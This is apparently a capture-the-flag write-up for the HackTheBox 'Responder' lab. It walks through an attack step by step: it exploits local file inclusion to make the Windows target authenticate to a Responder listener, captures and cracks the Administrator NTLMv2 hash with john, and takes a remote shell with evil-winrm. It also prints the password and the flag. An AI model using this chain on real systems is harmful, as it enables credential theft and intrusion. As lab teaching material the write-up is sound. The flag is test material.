---
title: "HackTheBox - Responder"
date: 2023-12-27 19:00:00 +0700
categories: [HackTheBox, Starting Point]
tags: [very easy, web, smb, winrm, responder]
image:
    path: /assets/img/hackthebox/starting_points/Responder.png
    alt: Responder - HackTheBox
---

[**Responder**](https://app.hackthebox.com/starting-point) is one of the Starting Points from [**HackTheBox**](https://app.hackthebox.com/), where in CTF Responder we will learn about **LFI (Local File Inclusion), Responder, John, WinRM (Evil-WinRM)**.

## Introduction

- Connect **Responder** using **Pwnbox** or **OpenVPN**.
- Spawn machine.

## Enumeration

To check the target connection and port, we can use **Ping** and **Nmap**.

### Ping

After spawn machine, we can start with `ping` Target IP.

```bash
❯ ping 10.129.93.102

PING 10.129.93.102 (10.129.93.102) 56(84) bytes of data.
64 bytes from 10.129.93.102: icmp_seq=1 ttl=127 time=534 ms
64 bytes from 10.129.93.102: icmp_seq=2 ttl=127 time=441 ms
64 bytes from 10.129.93.102: icmp_seq=3 ttl=127 time=344 ms
64 bytes from 10.129.93.102: icmp_seq=4 ttl=127 time=277 ms

--- 10.129.93.102 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 277.058/398.921/533.554/97.252 ms
```

### Nmap

Scan ports using `nmap`, `-sCV` is a combination of `-sC` and `-sV`, where `-sC` displays the script for the port and `-sV` displays the version info for the port.

```bash
❯ nmap -sCV 10.129.93.102

Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-28 05:30 WIB
Nmap scan report for JSN.JaringanKU (10.129.93.102)
Host is up (0.29s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.81 seconds
```

You can see that the port is open at 80/tcp which is the http service. let's open the website, and the result is that we can't connect to `unika.htb`, so we have to add it to `/etc/hosts`.

```bash
echo "10.129.93.102 unika.htb" | sudo tee -a /etc/hosts
```

If you have added it, try opening the website again.

![Desktop View](/assets/img/htb/include/Responder-1.png){: .w-75}

Try changing the language to French, the url will change to `...?page=french.html`. Now there is a possibility that it has potential vulnerability, we can use LFI (Local File Inclusion). Because this is Windows, we will try to open the Windows hosts `windows/system32/drivers/etc/hosts`, and we will use the LFI with `../`. Try until there are no errors.

![Desktop View](/assets/img/htb/include/Responder-2.png){: .w-75}

### Responder

Because we can use LFI, we will use Responder to get deeper information. Usually you already have Linux, if you don't have it or you are using Windows you can download it at [github](https://github.com/lgandx/Responder).

First of all, let's look at the responder configuration file `/usr/share/responder/Responder.conf`, make sure the SMB service is active and deactivate the http service (optional). Run the Responder, if you downloaded it from GitHub, run it using Python.

```
[Responder Core]

; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On

<snap>
```
{: file='Responder.conf'}

To run `responder` use superuser `sudo`, `-I` for the network interface to be used.

```bash
sudo responder -I tun0
```

Next, we return to the website, type `//` then your IP and the file/directory is up to you.

![Desktop View](/assets/img/htb/include/Responder-3.png){: .w-75}

Check the Responder.

```bash
<snap>

[+] Current Session Variables:
    Responder Machine Name     [WIN-0EJNMLDEOYI]
    Responder Domain Name      [KH1Q.LOCAL]
    Responder DCE-RPC Port     [45687]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.93.102
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:e8319f4aa521f8f1:3761E64929EC58B6514B0A2167225E75:01010000000000000068548C5B39DA01AD4FBC4ED730CAF500000000020008004B0048003100510001001E00570049004E002D00300045004A004E004D004C00440045004F005900490004003400570049004E002D00300045004A004E004D004C00440045004F00590049002E004B004800310051002E004C004F00430041004C00030014004B004800310051002E004C004F00430041004C00050014004B004800310051002E004C004F00430041004C00070008000068548C5B39DA010600040002000000080030003000000000000000010000000020000010D5853E6AE4FE8EE0FDE2AB3F1191CB7D4FE282857EA39622ED59EF5273F0560A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100320038000000000000000000
```

Copy the hash and put it in a new file, for example hash.txt

```bash
echo "Administrator::RESPONDER:e8319f4aa521f8f1:3761E64929EC58B6514B0A2167225E75:01010000000000000068548C5B39DA01AD4FBC4ED730CAF500000000020008004B0048003100510001001E00570049004E002D00300045004A004E004D004C00440045004F005900490004003400570049004E002D00300045004A004E004D004C00440045004F00590049002E004B004800310051002E004C004F00430041004C00030014004B004800310051002E004C004F00430041004C00050014004B004800310051002E004C004F00430041004C00070008000068548C5B39DA010600040002000000080030003000000000000000010000000020000010D5853E6AE4FE8EE0FDE2AB3F1191CB7D4FE282857EA39622ED59EF5273F0560A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100320038000000000000000000" > hash.txt
```

### Hash Cracking

OK, next we will crack the hash file using `john`, `-w` for the wordlist that will be used.

```bash
❯ sudo john -w=/usr/share/seclists/Passwords/rockyou.txt hash.txt

Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2023-12-28 07:29) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

## Foothold

The password for the administrator has been found, and now we will remote to the target using **WinRM**.

### WinRM

To use **WinRM** use the command `evil-winrm`,`-i` for the IP to be remote, `-u` for user login, and `-p` for login password.

```bash
evil-winrm -i 10.129.93.102 -u administrator -p badminton

Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls
    Directory: C:\Users\Administrator
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/11/2020   7:19 AM                3D Objects
d-r---        10/11/2020   7:19 AM                Contacts
d-r---          3/9/2022   5:34 PM                Desktop
d-r---         3/10/2022   4:51 AM                Documents
d-r---        10/11/2020   7:19 AM                Downloads
d-r---        10/11/2020   7:19 AM                Favorites
d-r---        10/11/2020   7:19 AM                Links
d-r---        10/11/2020   7:19 AM                Music
d-r---         4/27/2020   6:01 AM                OneDrive
d-r---        10/11/2020   7:19 AM                Pictures
d-r---        10/11/2020   7:19 AM                Saved Games
d-r---        10/11/2020   7:19 AM                Searches
d-r---        10/11/2020   7:19 AM                Videos

*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls
    Directory: C:\Users
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> ls
    Directory: C:\Users\mike
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop

*Evil-WinRM* PS C:\Users\mike> cd desktop
*Evil-WinRM* PS C:\Users\mike\desktop> ls
    Directory: C:\Users\mike\desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

*Evil-WinRM* PS C:\Users\mike\desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```